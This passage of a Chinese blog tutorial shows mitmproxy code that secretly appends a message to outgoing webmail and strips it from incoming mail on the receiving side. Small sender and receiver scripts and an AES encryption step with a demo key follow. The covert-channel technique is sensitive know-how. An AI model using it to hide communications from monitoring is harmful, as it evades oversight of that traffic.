<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> http</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> parse_qs, urlencode</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(<span class="string">&#x27;logger_url&#x27;</span>)</span><br><span class="line">formatter_url = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> handler <span class="keyword">in</span> logger.handlers[:]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(handler, logging.StreamHandler):</span><br><span class="line">        logger.removeHandler(handler)</span><br><span class="line">logger.setLevel(logging.DEBUG)</span><br><span class="line">filehandler_url = logging.FileHandler(<span class="string">&#x27;url.log&#x27;</span>)</span><br><span class="line">filehandler_url.setFormatter(formatter_url)</span><br><span class="line">logger.addHandler(filehandler_url)</span><br><span class="line">logger.info(<span class="string">&#x27;url log init&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># logger_text = logging.getLogger(&#x27;logger_text&#x27;)</span></span><br><span class="line"><span class="comment"># formatter_text = logging.Formatter(&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;)</span></span><br><span class="line"><span class="comment"># for handler in logger_text.handlers[:]:</span></span><br><span class="line"><span class="comment">#     if isinstance(handler, logging.StreamHandler):</span></span><br><span class="line"><span class="comment">#         logger_text.removeHandler(handler)</span></span><br><span class="line"><span class="comment"># logger_text.setLevel(logging.DEBUG)</span></span><br><span class="line"><span class="comment"># filehandler_text = logging.FileHandler(&#x27;text.log&#x27;)</span></span><br><span class="line"><span class="comment"># filehandler_text.setFormatter(formatter_text)</span></span><br><span class="line"><span class="comment"># logger_text.addHandler(filehandler_text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def request(flow: http.HTTPFlow) -&gt; None:</span></span><br><span class="line"><span class="comment">#     # 修改请求</span></span><br><span class="line"><span class="comment">#     # if &quot;letmefly.xyz&quot; in flow.request.pretty_url:</span></span><br><span class="line"><span class="comment">#     if &quot;web.letmefly.xyz&quot; in flow.request.pretty_url and &#x27;text/html&#x27; in flow.response.headers.get(&#x27;content-type&#x27;, &#x27;&#x27;):</span></span><br><span class="line"><span class="comment">#         # flow.request.headers[&quot;User-Agent&quot;] = &quot;Modified-Agent&quot;</span></span><br><span class="line"><span class="comment">#         flow.request.text  # 暂时未知</span></span><br><span class="line"><span class="comment">#     pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def response(flow: http.HTTPFlow) -&gt; None:</span></span><br><span class="line"><span class="comment">#     # 修改响应</span></span><br><span class="line"><span class="comment">#     logger.info(flow.request.pretty_url)</span></span><br><span class="line"><span class="comment">#     if &quot;web.letmefly.xyz&quot; in flow.request.pretty_url and &#x27;text/html&#x27; in flow.response.headers.get(&#x27;content-type&#x27;, &#x27;&#x27;):</span></span><br><span class="line"><span class="comment">#     # if flow.request.pretty_url == &#x27;https://web.letmefly.xyz/&#x27;:</span></span><br><span class="line"><span class="comment">#         logger.info(&#x27;replace HTML to LMTH&#x27;)</span></span><br><span class="line"><span class="comment">#         # logger_text.info(flow.response.text)</span></span><br><span class="line"><span class="comment">#         flow.response.text = flow.response.text.replace(&quot;HTML&quot;, &quot;LMTH&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://chat.deepseek.com/a/chat/s/354e2ce6-8c46-41f3-b32b-944407aaf2f1</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddSignatureAddon</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> flow.request.method == <span class="string">&quot;POST&quot;</span> <span class="keyword">and</span> <span class="string">&quot;/cgi-bin/compose_send&quot;</span> <span class="keyword">in</span> flow.request.url:</span><br><span class="line">            content_type = flow.request.headers.get(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;application/x-www-form-urlencoded&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> content_type:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="comment"># 解析原始表单数据</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                parsed_data = parse_qs(flow.request.content.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logger.info(<span class="string">f&quot;解析表单数据失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 修改content__html字段</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;content__html&quot;</span> <span class="keyword">in</span> parsed_data <span class="keyword">and</span> parsed_data[<span class="string">&quot;content__html&quot;</span>]:</span><br><span class="line">                original_content = parsed_data[<span class="string">&quot;content__html&quot;</span>][<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;letsender&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        hiddenMsg = f.read()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    hiddenMsg = <span class="string">&#x27;计划有变&#x27;</span></span><br><span class="line">                new_content = original_content + <span class="string">f&quot;*******<span class="subst">&#123;hiddenMsg&#125;</span>*******&quot;</span></span><br><span class="line">                parsed_data[<span class="string">&quot;content__html&quot;</span>][<span class="number">0</span>] = new_content</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 重新编码并更新请求内容</span></span><br><span class="line">                updated_content = urlencode(parsed_data, doseq=<span class="literal">True</span>).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                flow.request.content = updated_content</span><br><span class="line">                logger.info(<span class="string">&quot;成功添加签名！&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logger.info(<span class="string">&quot;未找到content__html字段&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">self, flow: http.HTTPFlow</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> flow.request.method == <span class="string">&#x27;GET&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;/cgi-bin/readmail&#x27;</span> <span class="keyword">in</span> flow.request.url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;text/html&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flow.response.headers.get(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                html_content = flow.response.content.decode(<span class="string">&quot;gb18030&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                logger.info(<span class="string">&#x27;解码失败：可能不是GB18030编码&#x27;</span>)</span><br><span class="line">            <span class="comment"># soup = BeautifulSoup(html_content, &quot;lxml&quot;)</span></span><br><span class="line">            <span class="comment"># content_div = soup.find(&quot;div&quot;, &#123;&quot;id&quot;: &quot;mailContentContainer&quot;&#125;)</span></span><br><span class="line">            <span class="comment"># logger.info(f&#x27;&#123;content_div&#125;&#x27;)</span></span><br><span class="line">            <span class="comment"># if not content_div:</span></span><br><span class="line">            <span class="comment">#     return</span></span><br><span class="line">            <span class="comment"># text_nodes = content_div.find_all(text=True, recursive=True)</span></span><br><span class="line">            <span class="comment"># for node in text_nodes:</span></span><br><span class="line">            <span class="comment">#     # 匹配签名模式（支持动态内容）</span></span><br><span class="line">            <span class="comment">#     match = re.search(r&#x27;\*&#123;7&#125;(.*?)\*&#123;7&#125;&#x27;, node.string)</span></span><br><span class="line">            <span class="comment">#     if match:</span></span><br><span class="line">            <span class="comment">#         signature = match.group(1)</span></span><br><span class="line">            <span class="comment">#         print(f&quot;提取到签名：&#123;signature&#125;&quot;)</span></span><br><span class="line">            <span class="comment">#         clean_text = re.sub(r&#x27;\*&#123;7&#125;.*?\*&#123;7&#125;&#x27;, &#x27;&#x27;, node.string)</span></span><br><span class="line">            <span class="comment">#         node.replace_with(clean_text)</span></span><br><span class="line">            <span class="comment"># # 不知道为啥，BS解析后直接把头部的编码给改了</span></span><br><span class="line">            <span class="comment"># meta_tag = soup.find(&quot;meta&quot;, attrs=&#123;&quot;http-equiv&quot;: &quot;Content-Type&quot;&#125;)</span></span><br><span class="line">            <span class="comment"># if meta_tag:</span></span><br><span class="line">            <span class="comment">#     meta_tag[&quot;content&quot;] = &quot;text/html; charset=gb18030&quot;</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;\*&#123;7&#125;(.*?)\*&#123;7&#125;&#x27;</span>, html_content)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                signature = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                logger.info(<span class="string">f&quot;提取到签名：<span class="subst">&#123;signature&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;letreceiver&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(signature)</span><br><span class="line">                html_content = re.sub(<span class="string">r&#x27;\*&#123;7&#125;.*?\*&#123;7&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, html_content)</span><br><span class="line">            flow.response.content = html_content.encode(<span class="string">&quot;gb18030&quot;</span>)</span><br><span class="line">            flow.response.headers[<span class="string">&quot;Content-Length&quot;</span>] = <span class="built_in">str</span>(<span class="built_in">len</span>(flow.response.content))</span><br><span class="line"></span><br><span class="line">addons = [AddSignatureAddon()]</span><br></pre></td></tr></table></figure>

<p>发送方demo：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = <span class="built_in">input</span>(<span class="string">&#x27;想隐蔽传输的信息：&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;letsender&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br></pre></td></tr></table></figure>

<p>接收方demo：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> watchdog.observers <span class="keyword">import</span> Observer</span><br><span class="line"><span class="keyword">from</span> watchdog.events <span class="keyword">import</span> FileSystemEventHandler</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FILE_PATH = <span class="string">&#x27;letreceiver&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(FILE_PATH):</span><br><span class="line">    os.system(<span class="string">f&#x27;echo &gt; <span class="subst">&#123;FILE_PATH&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FileChangeHandler</span>(<span class="title class_ inherited__">FileSystemEventHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_modified</span>(<span class="params">self, event</span>):</span><br><span class="line">        <span class="keyword">if</span> event.src_path.endswith(FILE_PATH):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;File <span class="subst">&#123;FILE_PATH&#125;</span> has been modified. Reading new content...&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.read_file_content()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_file_content</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(FILE_PATH, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                content = file.read()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;New content:&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(content)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error reading file: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 创建事件处理器和观察者</span></span><br><span class="line">    event_handler = FileChangeHandler()</span><br><span class="line">    observer = Observer()</span><br><span class="line">    observer.schedule(event_handler, path=<span class="string">&#x27;.&#x27;</span>, recursive=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动观察者</span></span><br><span class="line">    observer.start()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Started watching <span class="subst">&#123;FILE_PATH&#125;</span> for changes...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        observer.stop()</span><br><span class="line"></span><br><span class="line">    observer.join()</span><br></pre></td></tr></table></figure>

<h3 id="提升"><a href="#提升" class="headerlink" title="提升"></a>提升</h3><p>当然也可以通过AES加密</p>
<p>首先随机生成个AES密钥：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成256位（32字节）AES密钥</span></span><br><span class="line">key = get_random_bytes(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;AES Key:&quot;</span>, key.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>这里我们约定密钥为：<code>e3a9a39b3c95c109257aeb8c09cb8ad331779647c54de1a40a66d308f8e4a882</code>。</p>
<p>当然，在实际执行的时候，密钥可不能公布出来。</p>
<p>然后开始使用密钥加密解密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_aes</span>(<span class="params">plaintext: <span class="built_in">str</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC)  <span class="comment"># 使用CBC模式</span></span><br><span class="line">    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))</span><br><span class="line">    <span class="keyword">return</span> cipher.iv + ct_bytes  <span class="comment"># 返回IV + 密文</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_aes</span>(<span class="params">ciphertext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    iv = ciphertext[:AES.block_size]</span><br><span class="line">    ct = ciphertext[AES.block_size:]  <span class="comment"># 密文</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    pt = unpad(cipher.decrypt(ct), AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> pt.decode()</span><br><span class="line"></span><br><span class="line">msg = <span class="string">&#x27;其实今天要进攻&#x27;</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;e3a9a39b3c95c109257aeb8c09cb8ad331779647c54de1a40a66d308f8e4a882&#x27;</span>)  <span class="comment"># 演示用，实际可别公布</span></span><br><span class="line">encrypted = encrypt_aes(msg, key)</span><br><span class="line"><span class="built_in">print</span>(encrypted.<span class="built_in">hex</span>())</span><br><span class="line">decrypt = decrypt_aes(encrypted, key)</span><br><span class="line"><span class="built_in">print</span>(decrypt)</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek&gt; python main.py</span><br><span class="line">a41c71290d5ebc864b0feef9537a407d8b55504148bc0755b079cd4d1005cc7b80e9a98ec1df78a858a9ca8020208fc4</span><br><span class="line">其实今天要进攻</span><br><span class="line">PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek&gt; python main.py</span><br><span class="line">668c2d139c5729d432f403fa9bfad77fdb9c38cc0ae2f8dd66deff7141b656a46b36a3d2d82b8da07ee2a1e9c1179ee7</span><br><span class="line">其实今天要进攻</span><br><span class="line">PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek&gt; python main.py</span><br><span class="line">0a6b612c98f3d602f6185adf560d5467f3f4ca1505d6f913552a4d9de459f95cdeb25c3195410e50d3ffd40297e164e0</span><br><span class="line">其实今天要进攻</span><br><span class="line">PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek&gt; python main.py</span><br><span class="line">75e3cd8c45bd2223021b90deeec8352ca9bdd4f9bf816f03064099139541fa37b33a2b79e7d3a749c51ef7d4ec2a1dc1</span><br><span class="line">其实今天要进攻</span><br><span class="line">PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek&gt; python main.py</span><br><span class="line">a5d65efb6037ca9ff21d0aef20a03d1289cc6feb0f1616ebe49c4458c686a6a7da405fdeab7a2a706190783d3f9b7bd9</span><br><span class="line">其实今天要进攻</span><br></pre></td></tr></table></figure>

<p>不难发现，每次加密出来的结果都不一样，这就避免了“统计每个字符频率”等破解方法。</p>
<p>之后就是收发双方以此为依据进行数据加密与解密了。</p>
<h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><blockquote>
<p>同步发文于<a target="_blank" rel="noopener" href="https://letmefly.blog.csdn.net/article/details/146461437">CSDN</a>和我的<a href="https://blog.letmefly.xyz/">个人博客</a>，原创不易，转载经作者同意后请附上<a href="https://blog.letmefly.xyz/2025/03/23/Other-Network-HowToSendHiddenMsgThroughEmailWithMitmproxy/">原文链接</a>哦~</p>
<p>千篇源码题解<a target="_blank" rel="noopener" href="https://github.com/LetMeFly666/LeetCode">已开源</a></p>
</blockquote>
<div id="paginator"></div></div><div id="post-footer"></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/theme/arknights/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">&lt;a href=&quot;https://letmefly.xyz&quot;&gt;Tisfy&lt;/a&gt;</a></h1><div id="description"><p>LeetCode 题解、解题技巧 力扣题解 技术博客</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/LetMeFly666"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/440206990"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9mitmproxy%E9%80%9A%E8%BF%87%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E9%9A%90%E5%BC%8F%E4%BC%A0%E8%BE%93%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">借助mitmproxy通过电子邮件隐式传输信息</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">实现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B9%E5%8C%85"><span class="toc-number">1.2.1.</span> <span class="toc-text">改包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">邮件发送</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%82%AE%E4%BB%B6%E6%8E%A5%E6%94%B6"><span class="toc-number">1.2.3.</span> <span class="toc-text">邮件接收</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%8A%93%E5%8C%85"><span class="toc-number">1.2.4.</span> <span class="toc-text">客户端发送邮件抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8E%A5%E6%94%B6%E9%82%AE%E4%BB%B6%E6%8A%93%E5%8C%85"><span class="toc-number">1.2.5.</span> <span class="toc-text">客户端接收邮件抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E9%AA%8C%E8%AF%81-%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%97%B6%E5%90%8E%E5%8F%B0%E7%AF%A1%E6%94%B9"><span class="toc-number">1.2.6.</span> <span class="toc-text">消息验证 - 发送邮件时后台篡改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E9%AA%8C%E8%AF%81-%E6%94%B6%E5%88%B0%E9%82%AE%E4%BB%B6%E6%97%B6%E5%90%8E%E5%8F%B0%E7%AF%A1%E6%94%B9"><span class="toc-number">1.2.7.</span> <span class="toc-text">消息验证 - 收到邮件时后台篡改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B1%95%E7%A4%BA%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.2.8.</span> <span class="toc-text">展示工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.9.</span> <span class="toc-text">最终代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8D%87"><span class="toc-number">1.2.10.</span> <span class="toc-text">提升</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#End"><span class="toc-number">1.3.</span> <span class="toc-text">End</span></a></li></ol></li></ol></div></div><footer><nobr><span class="icp-title">ICP</span><a class="icp-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">京ICP备2021029766号-1</a></nobr><br><nobr><span class="icp-title">copyright</span><a class="icp-content" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a></nobr><br><nobr><a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a><span>'s </span><a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>ALL atricles by<a target="_blank" rel="noopener" href="https://letmefly.xyz/">Tisfy</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>